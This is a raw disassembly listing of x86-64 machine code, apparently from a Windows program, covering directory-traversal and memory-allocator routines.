  402e2c:	48 8b 8d 28 f9 ff ff 	mov    -0x6d8(%rbp),%rcx
  402e33:	48 8d 15 a6 15 01 00 	lea    0x115a6(%rip),%rdx        # 0x4143e0
  402e3a:	e8 00 50 00 00       	call   0x407e3f
  402e3f:	48 89 da             	mov    %rbx,%rdx
  402e42:	48 89 c1             	mov    %rax,%rcx
  402e45:	e8 69 fd ff ff       	call   0x402bb3
  402e4a:	48 89 85 20 f9 ff ff 	mov    %rax,-0x6e0(%rbp)
  402e51:	48 ff c0             	inc    %rax
  402e54:	0f 84 dc 03 00 00    	je     0x403236
  402e5a:	48 8d 9d 38 f9 ff ff 	lea    -0x6c8(%rbp),%rbx
  402e61:	48 89 d9             	mov    %rbx,%rcx
  402e64:	e8 a0 31 00 00       	call   0x406009
  402e69:	48 8d 4b 10          	lea    0x10(%rbx),%rcx
  402e6d:	48 89 ea             	mov    %rbp,%rdx
  402e70:	e8 d3 87 00 00       	call   0x40b648
  402e75:	48 98                	cltq
  402e77:	48 85 c0             	test   %rax,%rax
  402e7a:	48 89 85 40 f9 ff ff 	mov    %rax,-0x6c0(%rbp)
  402e81:	0f 85 87 01 00 00    	jne    0x40300e
  402e87:	48 8d bd 58 fb ff ff 	lea    -0x4a8(%rbp),%rdi
  402e8e:	4c 8d 67 2c          	lea    0x2c(%rdi),%r12
  402e92:	66 83 bd 84 fb ff ff 	cmpw   $0x2e,-0x47c(%rbp)
  402e99:	2e 
  402e9a:	75 24                	jne    0x402ec0
  402e9c:	66 8b 85 86 fb ff ff 	mov    -0x47a(%rbp),%ax
  402ea3:	66 85 c0             	test   %ax,%ax
  402ea6:	0f 84 2b 01 00 00    	je     0x402fd7
  402eac:	66 83 f8 2e          	cmp    $0x2e,%ax
  402eb0:	75 0e                	jne    0x402ec0
  402eb2:	66 83 bd 88 fb ff ff 	cmpw   $0x0,-0x478(%rbp)
  402eb9:	00 
  402eba:	0f 84 17 01 00 00    	je     0x402fd7
  402ec0:	8b 85 58 fb ff ff    	mov    -0x4a8(%rbp),%eax
  402ec6:	4c 89 e1             	mov    %r12,%rcx
  402ec9:	a8 10                	test   $0x10,%al
  402ecb:	40 0f 95 c6          	setne  %sil
  402ecf:	25 00 04 00 00       	and    $0x400,%eax
  402ed4:	01 f6                	add    %esi,%esi
  402ed6:	83 f8 01             	cmp    $0x1,%eax
  402ed9:	40 80 de ff          	sbb    $0xff,%sil
  402edd:	e8 58 f5 ff ff       	call   0x40243a
  402ee2:	48 89 c1             	mov    %rax,%rcx
  402ee5:	e8 40 fd ff ff       	call   0x402c2a
  402eea:	40 80 fe 02          	cmp    $0x2,%sil
  402eee:	48 89 c3             	mov    %rax,%rbx
  402ef1:	0f 85 e0 00 00 00    	jne    0x402fd7
  402ef7:	48 8d 15 d2 14 01 00 	lea    0x114d2(%rip),%rdx        # 0x4143d0
  402efe:	31 c0                	xor    %eax,%eax
  402f00:	48 85 db             	test   %rbx,%rbx
  402f03:	0f 84 ce 00 00 00    	je     0x402fd7
  402f09:	48 3b 03             	cmp    (%rbx),%rax
  402f0c:	0f 8d c5 00 00 00    	jge    0x402fd7
  402f12:	40 8a 34 02          	mov    (%rdx,%rax,1),%sil
  402f16:	40 38 74 03 10       	cmp    %sil,0x10(%rbx,%rax,1)
  402f1b:	0f 85 b6 00 00 00    	jne    0x402fd7
  402f21:	48 ff c0             	inc    %rax
  402f24:	48 83 f8 07          	cmp    $0x7,%rax
  402f28:	75 d6                	jne    0x402f00
  402f2a:	48 8d 15 6f 14 01 00 	lea    0x1146f(%rip),%rdx        # 0x4143a0
  402f31:	48 89 d9             	mov    %rbx,%rcx
  402f34:	e8 06 4f 00 00       	call   0x407e3f
  402f39:	48 8b 15 90 47 01 00 	mov    0x14790(%rip),%rdx        # 0x4176d0
  402f40:	48 8b 8d 30 f9 ff ff 	mov    -0x6d0(%rbp),%rcx
  402f47:	49 89 c6             	mov    %rax,%r14
  402f4a:	e8 d6 2e 00 00       	call   0x405e25
  402f4f:	4c 89 f1             	mov    %r14,%rcx
  402f52:	48 89 c6             	mov    %rax,%rsi
  402f55:	48 8b 00             	mov    (%rax),%rax
  402f58:	4c 8d 3c c6          	lea    (%rsi,%rax,8),%r15
  402f5c:	48 8d 50 01          	lea    0x1(%rax),%rdx
  402f60:	48 89 16             	mov    %rdx,(%rsi)
  402f63:	4d 8b 6f 10          	mov    0x10(%r15),%r13
  402f67:	e8 2e 22 00 00       	call   0x40519a
  402f6c:	49 89 47 10          	mov    %rax,0x10(%r15)
  402f70:	4d 85 ed             	test   %r13,%r13
  402f73:	74 08                	je     0x402f7d
  402f75:	4c 89 e9             	mov    %r13,%rcx
  402f78:	e8 83 ad 00 00       	call   0x40dd00
  402f7d:	48 8d 15 fc 13 01 00 	lea    0x113fc(%rip),%rdx        # 0x414380
  402f84:	48 89 d9             	mov    %rbx,%rcx
  402f87:	e8 b3 4e 00 00       	call   0x407e3f
  402f8c:	48 8b 15 3d 47 01 00 	mov    0x1473d(%rip),%rdx        # 0x4176d0
  402f93:	48 89 f1             	mov    %rsi,%rcx
  402f96:	49 89 c5             	mov    %rax,%r13
  402f99:	e8 87 2e 00 00       	call   0x405e25
  402f9e:	4c 89 e9             	mov    %r13,%rcx
  402fa1:	48 89 85 30 f9 ff ff 	mov    %rax,-0x6d0(%rbp)
  402fa8:	48 8b 00             	mov    (%rax),%rax
  402fab:	48 8b b5 30 f9 ff ff 	mov    -0x6d0(%rbp),%rsi
  402fb2:	48 8d 50 01          	lea    0x1(%rax),%rdx
  402fb6:	48 89 16             	mov    %rdx,(%rsi)
  402fb9:	48 8d 34 c6          	lea    (%rsi,%rax,8),%rsi
  402fbd:	48 8b 5e 10          	mov    0x10(%rsi),%rbx
  402fc1:	e8 d4 21 00 00       	call   0x40519a
  402fc6:	48 89 46 10          	mov    %rax,0x10(%rsi)
  402fca:	48 85 db             	test   %rbx,%rbx
  402fcd:	74 08                	je     0x402fd7
  402fcf:	48 89 d9             	mov    %rbx,%rcx
  402fd2:	e8 29 ad 00 00       	call   0x40dd00
  402fd7:	48 8b 05 42 41 01 00 	mov    0x14142(%rip),%rax        # 0x417120
  402fde:	48 89 fa             	mov    %rdi,%rdx
  402fe1:	48 8b 8d 20 f9 ff ff 	mov    -0x6e0(%rbp),%rcx
  402fe8:	ff 10                	call   *(%rax)
  402fea:	85 c0                	test   %eax,%eax
  402fec:	0f 85 a0 fe ff ff    	jne    0x402e92
  402ff2:	48 8b 05 d7 40 01 00 	mov    0x140d7(%rip),%rax        # 0x4170d0
  402ff9:	ff 10                	call   *(%rax)
  402ffb:	83 f8 12             	cmp    $0x12,%eax
  402ffe:	74 0e                	je     0x40300e
  403000:	31 d2                	xor    %edx,%edx
  403002:	89 c1                	mov    %eax,%ecx
  403004:	e8 97 50 00 00       	call   0x4080a0
  403009:	e9 84 fe ff ff       	jmp    0x402e92
  40300e:	e8 9e 2f 00 00       	call   0x405fb1
  403013:	48 8b 05 16 41 01 00 	mov    0x14116(%rip),%rax        # 0x417130
  40301a:	48 8b 8d 20 f9 ff ff 	mov    -0x6e0(%rbp),%rcx
  403021:	ff 10                	call   *(%rax)
  403023:	48 83 bd 40 f9 ff ff 	cmpq   $0x0,-0x6c0(%rbp)
  40302a:	00 
  40302b:	e9 ff 01 00 00       	jmp    0x40322f
  403030:	e8 0a 4e 00 00       	call   0x407e3f
  403035:	31 f6                	xor    %esi,%esi
  403037:	48 89 c1             	mov    %rax,%rcx
  40303a:	48 89 85 28 f9 ff ff 	mov    %rax,-0x6d8(%rbp)
  403041:	e8 bf 48 00 00       	call   0x407905
  403046:	84 c0                	test   %al,%al
  403048:	0f 84 00 02 00 00    	je     0x40324e
  40304e:	48 8d 9d a8 fd ff ff 	lea    -0x258(%rbp),%rbx
  403055:	ba 50 02 00 00       	mov    $0x250,%edx
  40305a:	48 89 d9             	mov    %rbx,%rcx
  40305d:	e8 ea 10 00 00       	call   0x40414c
  403062:	48 8b 8d 28 f9 ff ff 	mov    -0x6d8(%rbp),%rcx
  403069:	48 8d 15 70 13 01 00 	lea    0x11370(%rip),%rdx        # 0x4143e0
  403070:	e8 ca 4d 00 00       	call   0x407e3f
  403075:	48 89 da             	mov    %rbx,%rdx
  403078:	48 89 c1             	mov    %rax,%rcx
  40307b:	e8 33 fb ff ff       	call   0x402bb3
  403080:	48 89 85 18 f9 ff ff 	mov    %rax,-0x6e8(%rbp)
  403087:	48 ff c0             	inc    %rax
  40308a:	0f 84 a6 01 00 00    	je     0x403236
  403090:	48 8d 9d 48 fa ff ff 	lea    -0x5b8(%rbp),%rbx
  403097:	48 89 d9             	mov    %rbx,%rcx
  40309a:	e8 6a 2f 00 00       	call   0x406009
  40309f:	48 8d 4b 10          	lea    0x10(%rbx),%rcx
  4030a3:	48 89 ea             	mov    %rbp,%rdx
  4030a6:	e8 9d 85 00 00       	call   0x40b648
  4030ab:	48 98                	cltq
  4030ad:	48 85 c0             	test   %rax,%rax
  4030b0:	48 89 85 50 fa ff ff 	mov    %rax,-0x5b0(%rbp)
  4030b7:	0f 85 55 01 00 00    	jne    0x403212
  4030bd:	48 8d b5 a8 fd ff ff 	lea    -0x258(%rbp),%rsi
  4030c4:	4c 8d 66 2c          	lea    0x2c(%rsi),%r12
  4030c8:	66 83 bd d4 fd ff ff 	cmpw   $0x2e,-0x22c(%rbp)
  4030cf:	2e 
  4030d0:	75 24                	jne    0x4030f6
  4030d2:	66 8b 85 d6 fd ff ff 	mov    -0x22a(%rbp),%ax
  4030d9:	66 85 c0             	test   %ax,%ax
  4030dc:	0f 84 f9 00 00 00    	je     0x4031db
  4030e2:	66 83 f8 2e          	cmp    $0x2e,%ax
  4030e6:	75 0e                	jne    0x4030f6
  4030e8:	66 83 bd d8 fd ff ff 	cmpw   $0x0,-0x228(%rbp)
  4030ef:	00 
  4030f0:	0f 84 e5 00 00 00    	je     0x4031db
  4030f6:	8b 85 a8 fd ff ff    	mov    -0x258(%rbp),%eax
  4030fc:	4c 89 e1             	mov    %r12,%rcx
  4030ff:	a8 10                	test   $0x10,%al
  403101:	0f 95 c3             	setne  %bl
  403104:	25 00 04 00 00       	and    $0x400,%eax
  403109:	01 db                	add    %ebx,%ebx
  40310b:	83 f8 01             	cmp    $0x1,%eax
  40310e:	80 db ff             	sbb    $0xff,%bl
  403111:	e8 24 f3 ff ff       	call   0x40243a
  403116:	48 89 c1             	mov    %rax,%rcx
  403119:	e8 0c fb ff ff       	call   0x402c2a
  40311e:	80 fb 02             	cmp    $0x2,%bl
  403121:	49 89 c6             	mov    %rax,%r14
  403124:	0f 85 b1 00 00 00    	jne    0x4031db
  40312a:	48 8d 15 2f 12 01 00 	lea    0x1122f(%rip),%rdx        # 0x414360
  403131:	48 89 c1             	mov    %rax,%rcx
  403134:	e8 06 4d 00 00       	call   0x407e3f
  403139:	48 8b 15 90 45 01 00 	mov    0x14590(%rip),%rdx        # 0x4176d0
  403140:	48 8b 8d 30 f9 ff ff 	mov    -0x6d0(%rbp),%rcx
  403147:	49 89 c7             	mov    %rax,%r15
  40314a:	e8 d6 2c 00 00       	call   0x405e25
  40314f:	4c 89 f9             	mov    %r15,%rcx
  403152:	48 89 c3             	mov    %rax,%rbx
  403155:	48 8b 00             	mov    (%rax),%rax
  403158:	48 8d 3c c3          	lea    (%rbx,%rax,8),%rdi
  40315c:	48 8d 50 01          	lea    0x1(%rax),%rdx
  403160:	48 89 13             	mov    %rdx,(%rbx)
  403163:	4c 8b 6f 10          	mov    0x10(%rdi),%r13
  403167:	e8 2e 20 00 00       	call   0x40519a
  40316c:	48 89 47 10          	mov    %rax,0x10(%rdi)
  403170:	4d 85 ed             	test   %r13,%r13
  403173:	75 5c                	jne    0x4031d1
  403175:	48 8d 15 c4 11 01 00 	lea    0x111c4(%rip),%rdx        # 0x414340
  40317c:	4c 89 f1             	mov    %r14,%rcx
  40317f:	e8 bb 4c 00 00       	call   0x407e3f
  403184:	48 8b 15 45 45 01 00 	mov    0x14545(%rip),%rdx        # 0x4176d0
  40318b:	48 89 d9             	mov    %rbx,%rcx
  40318e:	49 89 c6             	mov    %rax,%r14
  403191:	e8 8f 2c 00 00       	call   0x405e25
  403196:	4c 89 f1             	mov    %r14,%rcx
  403199:	48 89 85 30 f9 ff ff 	mov    %rax,-0x6d0(%rbp)
  4031a0:	48 8b 00             	mov    (%rax),%rax
  4031a3:	48 8b bd 30 f9 ff ff 	mov    -0x6d0(%rbp),%rdi
  4031aa:	48 8d 50 01          	lea    0x1(%rax),%rdx
  4031ae:	4c 8d 2c c7          	lea    (%rdi,%rax,8),%r13
  4031b2:	48 89 17             	mov    %rdx,(%rdi)
  4031b5:	49 8b 5d 10          	mov    0x10(%r13),%rbx
  4031b9:	e8 dc 1f 00 00       	call   0x40519a
  4031be:	49 89 45 10          	mov    %rax,0x10(%r13)
  4031c2:	48 85 db             	test   %rbx,%rbx
  4031c5:	74 14                	je     0x4031db
  4031c7:	48 89 d9             	mov    %rbx,%rcx
  4031ca:	e8 31 ab 00 00       	call   0x40dd00
  4031cf:	eb 0a                	jmp    0x4031db
  4031d1:	4c 89 e9             	mov    %r13,%rcx
  4031d4:	e8 27 ab 00 00       	call   0x40dd00
  4031d9:	eb 9a                	jmp    0x403175
  4031db:	48 8b 05 3e 3f 01 00 	mov    0x13f3e(%rip),%rax        # 0x417120
  4031e2:	48 89 f2             	mov    %rsi,%rdx
  4031e5:	48 8b 8d 18 f9 ff ff 	mov    -0x6e8(%rbp),%rcx
  4031ec:	ff 10                	call   *(%rax)
  4031ee:	85 c0                	test   %eax,%eax
  4031f0:	0f 85 d2 fe ff ff    	jne    0x4030c8
  4031f6:	48 8b 05 d3 3e 01 00 	mov    0x13ed3(%rip),%rax        # 0x4170d0
  4031fd:	ff 10                	call   *(%rax)
  4031ff:	83 f8 12             	cmp    $0x12,%eax
  403202:	74 0e                	je     0x403212
  403204:	31 d2                	xor    %edx,%edx
  403206:	89 c1                	mov    %eax,%ecx
  403208:	e8 93 4e 00 00       	call   0x4080a0
  40320d:	e9 b6 fe ff ff       	jmp    0x4030c8
  403212:	e8 9a 2d 00 00       	call   0x405fb1
  403217:	48 8b 05 12 3f 01 00 	mov    0x13f12(%rip),%rax        # 0x417130
  40321e:	48 8b 8d 18 f9 ff ff 	mov    -0x6e8(%rbp),%rcx
  403225:	ff 10                	call   *(%rax)
  403227:	48 83 bd 50 fa ff ff 	cmpq   $0x0,-0x5b0(%rbp)
  40322e:	00 
  40322f:	74 05                	je     0x403236
  403231:	e8 46 5e 00 00       	call   0x40907c
  403236:	48 83 bd 30 f9 ff ff 	cmpq   $0x0,-0x6d0(%rbp)
  40323d:	00 
  40323e:	74 4d                	je     0x40328d
  403240:	48 8b 85 30 f9 ff ff 	mov    -0x6d0(%rbp),%rax
  403247:	48 8b 30             	mov    (%rax),%rsi
  40324a:	eb 02                	jmp    0x40324e
  40324c:	31 f6                	xor    %esi,%esi
  40324e:	31 db                	xor    %ebx,%ebx
  403250:	48 39 f3             	cmp    %rsi,%rbx
  403253:	7d 38                	jge    0x40328d
  403255:	48 8b 85 30 f9 ff ff 	mov    -0x6d0(%rbp),%rax
  40325c:	48 8b 8d 28 f9 ff ff 	mov    -0x6d8(%rbp),%rcx
  403263:	48 8b 54 d8 10       	mov    0x10(%rax,%rbx,8),%rdx
  403268:	e8 d2 4b 00 00       	call   0x407e3f
  40326d:	48 89 c1             	mov    %rax,%rcx
  403270:	48 89 c7             	mov    %rax,%rdi
  403273:	e8 0d f9 ff ff       	call   0x402b85
  403278:	84 c0                	test   %al,%al
  40327a:	75 05                	jne    0x403281
  40327c:	48 ff c3             	inc    %rbx
  40327f:	eb cf                	jmp    0x403250
  403281:	31 d2                	xor    %edx,%edx
  403283:	48 89 f9             	mov    %rdi,%rcx
  403286:	e8 e6 f3 ff ff       	call   0x402671
  40328b:	eb ef                	jmp    0x40327c
  40328d:	48 81 c4 08 07 00 00 	add    $0x708,%rsp
  403294:	5b                   	pop    %rbx
  403295:	5e                   	pop    %rsi
  403296:	5f                   	pop    %rdi
  403297:	41 5c                	pop    %r12
  403299:	41 5d                	pop    %r13
  40329b:	41 5e                	pop    %r14
  40329d:	41 5f                	pop    %r15
  40329f:	5d                   	pop    %rbp
  4032a0:	c3                   	ret
  4032a1:	90                   	nop
  4032a2:	90                   	nop
  4032a3:	90                   	nop
  4032a4:	90                   	nop
  4032a5:	90                   	nop
  4032a6:	90                   	nop
  4032a7:	90                   	nop
  4032a8:	90                   	nop
  4032a9:	90                   	nop
  4032aa:	90                   	nop
  4032ab:	90                   	nop
  4032ac:	90                   	nop
  4032ad:	90                   	nop
  4032ae:	90                   	nop
  4032af:	90                   	nop
  4032b0:	48 83 ec 18          	sub    $0x18,%rsp
  4032b4:	48 c7 44 24 08 00 00 	movq   $0x0,0x8(%rsp)
  4032bb:	00 00 
  4032bd:	48 8d 44 24 08       	lea    0x8(%rsp),%rax
  4032c2:	48 89 44 24 08       	mov    %rax,0x8(%rsp)
  4032c7:	48 8b 54 24 08       	mov    0x8(%rsp),%rdx
  4032cc:	31 c0                	xor    %eax,%eax
  4032ce:	48 85 d2             	test   %rdx,%rdx
  4032d1:	74 0b                	je     0x4032de
  4032d3:	48 8b 54 24 08       	mov    0x8(%rsp),%rdx
  4032d8:	48 8b 01             	mov    (%rcx),%rax
  4032db:	48 29 d0             	sub    %rdx,%rax
  4032de:	48 83 c4 18          	add    $0x18,%rsp
  4032e2:	c3                   	ret
  4032e3:	c3                   	ret
  4032e4:	c3                   	ret
  4032e5:	57                   	push   %rdi
  4032e6:	56                   	push   %rsi
  4032e7:	53                   	push   %rbx
  4032e8:	48 83 ec 20          	sub    $0x20,%rsp
  4032ec:	48 8b 02             	mov    (%rdx),%rax
  4032ef:	48 3b 00             	cmp    (%rax),%rax
  4032f2:	48 89 cb             	mov    %rcx,%rbx
  4032f5:	48 89 d6             	mov    %rdx,%rsi
  4032f8:	4c 89 c7             	mov    %r8,%rdi
  4032fb:	0f 84 1b 01 00 00    	je     0x40341c
  403301:	48 89 81 b8 30 00 00 	mov    %rax,0x30b8(%rcx)
  403308:	48 8b 12             	mov    (%rdx),%rdx
  40330b:	4c 3b 42 10          	cmp    0x10(%rdx),%r8
  40330f:	72 0e                	jb     0x40331f
  403311:	48 89 91 b0 30 00 00 	mov    %rdx,0x30b0(%rcx)
  403318:	48 8b 06             	mov    (%rsi),%rax
  40331b:	48 8d 50 08          	lea    0x8(%rax),%rdx
  40331f:	48 89 d9             	mov    %rbx,%rcx
  403322:	49 89 f8             	mov    %rdi,%r8
  403325:	e8 bb ff ff ff       	call   0x4032e5
  40332a:	48 8b 06             	mov    (%rsi),%rax
  40332d:	48 8b 8b b8 30 00 00 	mov    0x30b8(%rbx),%rcx
  403334:	48 39 c8             	cmp    %rcx,%rax
  403337:	0f 94 c2             	sete   %dl
  40333a:	75 0d                	jne    0x403349
  40333c:	48 8b 93 b0 30 00 00 	mov    0x30b0(%rbx),%rdx
  403343:	48 39 12             	cmp    %rdx,(%rdx)
  403346:	0f 95 c2             	setne  %dl
  403349:	84 d2                	test   %dl,%dl
  40334b:	74 67                	je     0x4033b4
  40334d:	48 8b 93 b0 30 00 00 	mov    0x30b0(%rbx),%rdx
  403354:	48 3b 7a 10          	cmp    0x10(%rdx),%rdi
  403358:	75 5a                	jne    0x4033b4
  40335a:	48 8b 48 10          	mov    0x10(%rax),%rcx
  40335e:	48 83 bb d8 30 00 00 	cmpq   $0x0,0x30d8(%rbx)
  403365:	00 
  403366:	48 8b 40 18          	mov    0x18(%rax),%rax
  40336a:	48 89 4a 10          	mov    %rcx,0x10(%rdx)
  40336e:	48 89 42 18          	mov    %rax,0x18(%rdx)
  403372:	48 8d 83 d8 30 00 00 	lea    0x30d8(%rbx),%rax
  403379:	75 0e                	jne    0x403389
  40337b:	48 89 83 d8 30 00 00 	mov    %rax,0x30d8(%rbx)
  403382:	48 89 83 e0 30 00 00 	mov    %rax,0x30e0(%rbx)
  403389:	48 89 83 b0 30 00 00 	mov    %rax,0x30b0(%rbx)
  403390:	48 8b 06             	mov    (%rsi),%rax
  403393:	48 8b 40 08          	mov    0x8(%rax),%rax
  403397:	48 89 06             	mov    %rax,(%rsi)
  40339a:	48 8b 83 b8 30 00 00 	mov    0x30b8(%rbx),%rax
  4033a1:	48 8b 93 c0 30 00 00 	mov    0x30c0(%rbx),%rdx
  4033a8:	48 89 10             	mov    %rdx,(%rax)
  4033ab:	48 89 83 c0 30 00 00 	mov    %rax,0x30c0(%rbx)
  4033b2:	eb 68                	jmp    0x40341c
  4033b4:	48 8b 08             	mov    (%rax),%rcx
  4033b7:	48 8b 78 20          	mov    0x20(%rax),%rdi
  4033bb:	48 8d 57 ff          	lea    -0x1(%rdi),%rdx
  4033bf:	48 39 51 20          	cmp    %rdx,0x20(%rcx)
  4033c3:	48 8b 48 08          	mov    0x8(%rax),%rcx
  4033c7:	7c 06                	jl     0x4033cf
  4033c9:	48 3b 51 20          	cmp    0x20(%rcx),%rdx
  4033cd:	7e 4d                	jle    0x40341c
  4033cf:	48 89 50 20          	mov    %rdx,0x20(%rax)
  4033d3:	48 3b 51 20          	cmp    0x20(%rcx),%rdx
  4033d7:	7d 04                	jge    0x4033dd
  4033d9:	48 89 51 20          	mov    %rdx,0x20(%rcx)
  4033dd:	48 89 f1             	mov    %rsi,%rcx
  4033e0:	e8 ef e2 ff ff       	call   0x4016d4
  4033e5:	48 8b 06             	mov    (%rsi),%rax
  4033e8:	48 8d 48 08          	lea    0x8(%rax),%rcx
  4033ec:	e8 e3 e2 ff ff       	call   0x4016d4
  4033f1:	48 8b 06             	mov    (%rsi),%rax
  4033f4:	48 8b 48 08          	mov    0x8(%rax),%rcx
  4033f8:	48 83 c1 08          	add    $0x8,%rcx
  4033fc:	e8 d3 e2 ff ff       	call   0x4016d4
  403401:	48 89 f1             	mov    %rsi,%rcx
  403404:	e8 9e e2 ff ff       	call   0x4016a7
  403409:	48 8b 0e             	mov    (%rsi),%rcx
  40340c:	48 83 c1 08          	add    $0x8,%rcx
  403410:	48 83 c4 20          	add    $0x20,%rsp
  403414:	5b                   	pop    %rbx
  403415:	5e                   	pop    %rsi
  403416:	5f                   	pop    %rdi
  403417:	e9 8b e2 ff ff       	jmp    0x4016a7
  40341c:	48 83 c4 20          	add    $0x20,%rsp
  403420:	5b                   	pop    %rbx
  403421:	5e                   	pop    %rsi
  403422:	5f                   	pop    %rdi
  403423:	c3                   	ret
  403424:	53                   	push   %rbx
  403425:	48 83 ec 20          	sub    $0x20,%rsp
  403429:	48 89 d3             	mov    %rdx,%rbx
  40342c:	48 c1 fa 09          	sar    $0x9,%rdx
  403430:	e8 8c e3 ff ff       	call   0x4017c1
  403435:	48 85 c0             	test   %rax,%rax
  403438:	74 21                	je     0x40345b
  40343a:	81 e3 ff 01 00 00    	and    $0x1ff,%ebx
  403440:	41 b8 01 00 00 00    	mov    $0x1,%r8d
  403446:	48 89 d9             	mov    %rbx,%rcx
  403449:	48 89 da             	mov    %rbx,%rdx
  40344c:	48 c1 fa 06          	sar    $0x6,%rdx
  403450:	49 d3 e0             	shl    %cl,%r8
  403453:	49 f7 d0             	not    %r8
  403456:	4c 21 44 d0 10       	and    %r8,0x10(%rax,%rdx,8)
  40345b:	48 83 c4 20          	add    $0x20,%rsp
  40345f:	5b                   	pop    %rbx
  403460:	c3                   	ret
  403461:	56                   	push   %rsi
  403462:	53                   	push   %rbx
  403463:	48 83 ec 38          	sub    $0x38,%rsp
  403467:	48 89 d3             	mov    %rdx,%rbx
  40346a:	48 8b 52 08          	mov    0x8(%rdx),%rdx
  40346e:	48 89 ce             	mov    %rcx,%rsi
  403471:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
  403476:	e8 7b e2 ff ff       	call   0x4016f6
  40347b:	48 8b 43 10          	mov    0x10(%rbx),%rax
  40347f:	4c 8b 44 24 20       	mov    0x20(%rsp),%r8
  403484:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
  403489:	48 85 c0             	test   %rax,%rax
  40348c:	74 08                	je     0x403496
  40348e:	48 8b 53 18          	mov    0x18(%rbx),%rdx
  403492:	48 89 50 18          	mov    %rdx,0x18(%rax)
  403496:	48 8b 53 18          	mov    0x18(%rbx),%rdx
  40349a:	48 85 d2             	test   %rdx,%rdx
  40349d:	74 04                	je     0x4034a3
  40349f:	48 89 42 10          	mov    %rax,0x10(%rdx)
  4034a3:	4c 89 c0             	mov    %r8,%rax
  4034a6:	48 c1 e0 05          	shl    $0x5,%rax
  4034aa:	48 01 c8             	add    %rcx,%rax
  4034ad:	48 8d 14 c6          	lea    (%rsi,%rax,8),%rdx
  4034b1:	48 3b 9a 78 10 00 00 	cmp    0x1078(%rdx),%rbx
  4034b8:	75 3e                	jne    0x4034f8
  4034ba:	48 8b 43 10          	mov    0x10(%rbx),%rax
  4034be:	48 85 c0             	test   %rax,%rax
  4034c1:	48 89 82 78 10 00 00 	mov    %rax,0x1078(%rdx)
  4034c8:	75 2e                	jne    0x4034f8
  4034ca:	4e 8d 0c 86          	lea    (%rsi,%r8,4),%r9
  4034ce:	b8 01 00 00 00       	mov    $0x1,%eax
  4034d3:	83 e1 1f             	and    $0x1f,%ecx
  4034d6:	48 89 c2             	mov    %rax,%rdx
  4034d9:	48 d3 e2             	shl    %cl,%rdx
  4034dc:	f7 d2                	not    %edx
  4034de:	41 21 91 14 10 00 00 	and    %edx,0x1014(%r9)
  4034e5:	75 11                	jne    0x4034f8
  4034e7:	44 89 c1             	mov    %r8d,%ecx
  4034ea:	83 e1 1f             	and    $0x1f,%ecx
  4034ed:	48 d3 e0             	shl    %cl,%rax
  4034f0:	f7 d0                	not    %eax
  4034f2:	21 86 10 10 00 00    	and    %eax,0x1010(%rsi)
  4034f8:	48 c7 43 18 00 00 00 	movq   $0x0,0x18(%rbx)
  4034ff:	00 
  403500:	48 c7 43 10 00 00 00 	movq   $0x0,0x10(%rbx)
  403507:	00 
  403508:	48 83 c4 38          	add    $0x38,%rsp
  40350c:	5b                   	pop    %rbx
  40350d:	5e                   	pop    %rsi
  40350e:	c3                   	ret
  40350f:	41 55                	push   %r13
  403511:	41 54                	push   %r12
  403513:	55                   	push   %rbp
  403514:	57                   	push   %rdi
  403515:	56                   	push   %rsi
  403516:	53                   	push   %rbx
  403517:	48 83 ec 28          	sub    $0x28,%rsp
  40351b:	48 8b 42 08          	mov    0x8(%rdx),%rax
  40351f:	48 01 81 90 28 00 00 	add    %rax,0x2890(%rcx)
  403526:	48 8b 02             	mov    (%rdx),%rax
  403529:	48 8d a9 a8 28 00 00 	lea    0x28a8(%rcx),%rbp
  403530:	48 89 ce             	mov    %rcx,%rsi
  403533:	48 89 d3             	mov    %rdx,%rbx
  403536:	48 83 e0 fe          	and    $0xfffffffffffffffe,%rax
  40353a:	48 85 c0             	test   %rax,%rax
  40353d:	48 89 02             	mov    %rax,(%rdx)
  403540:	0f 84 80 00 00 00    	je     0x4035c6
  403546:	48 89 d7             	mov    %rdx,%rdi
  403549:	48 89 e9             	mov    %rbp,%rcx
  40354c:	48 29 c7             	sub    %rax,%rdi
  40354f:	48 89 fa             	mov    %rdi,%rdx
  403552:	48 c1 fa 0c          	sar    $0xc,%rdx
  403556:	e8 7e e2 ff ff       	call   0x4017d9
  40355b:	84 c0                	test   %al,%al
  40355d:	74 67                	je     0x4035c6
  40355f:	f6 07 01             	testb  $0x1,(%rdi)
  403562:	75 62                	jne    0x4035c6
  403564:	48 8b 47 08          	mov    0x8(%rdi),%rax
  403568:	48 3d c8 0f 00 00    	cmp    $0xfc8,%rax
  40356e:	7e 56                	jle    0x4035c6
  403570:	48 3d ff ff ff 3e    	cmp    $0x3effffff,%rax
  403576:	7f 4e                	jg     0x4035c6
  403578:	48 89 fa             	mov    %rdi,%rdx
  40357b:	48 89 f1             	mov    %rsi,%rcx
  40357e:	e8 de fe ff ff       	call   0x403461
  403583:	48 8b 43 08          	mov    0x8(%rbx),%rax
  403587:	48 c1 fb 0c          	sar    $0xc,%rbx
  40358b:	48 89 e9             	mov    %rbp,%rcx
  40358e:	48 01 47 08          	add    %rax,0x8(%rdi)
  403592:	48 89 da             	mov    %rbx,%rdx
  403595:	48 89 fb             	mov    %rdi,%rbx
  403598:	e8 87 fe ff ff       	call   0x403424
  40359d:	48 81 7f 08 00 00 00 	cmpq   $0x3f000000,0x8(%rdi)
  4035a4:	3f 
  4035a5:	7e 1f                	jle    0x4035c6
  4035a7:	48 89 fa             	mov    %rdi,%rdx
  4035aa:	48 89 f1             	mov    %rsi,%rcx
  4035ad:	41 b8 00 00 00 3f    	mov    $0x3f000000,%r8d
  4035b3:	e8 68 e4 ff ff       	call   0x401a20
  4035b8:	48 89 fa             	mov    %rdi,%rdx
  4035bb:	48 89 f1             	mov    %rsi,%rcx
  4035be:	48 89 c3             	mov    %rax,%rbx
  4035c1:	e8 7c e1 ff ff       	call   0x401742
  4035c6:	4c 8b 6b 08          	mov    0x8(%rbx),%r13
  4035ca:	48 89 e9             	mov    %rbp,%rcx
  4035cd:	4a 8d 3c 2b          	lea    (%rbx,%r13,1),%rdi
  4035d1:	49 89 fc             	mov    %rdi,%r12
  4035d4:	49 c1 fc 0c          	sar    $0xc,%r12
  4035d8:	4c 89 e2             	mov    %r12,%rdx
  4035db:	e8 f9 e1 ff ff       	call   0x4017d9
  4035e0:	84 c0                	test   %al,%al
  4035e2:	74 5c                	je     0x403640
  4035e4:	f6 07 01             	testb  $0x1,(%rdi)
  4035e7:	75 57                	jne    0x403640
  4035e9:	48 81 7f 08 c8 0f 00 	cmpq   $0xfc8,0x8(%rdi)
  4035f0:	00 
  4035f1:	7e 4d                	jle    0x403640
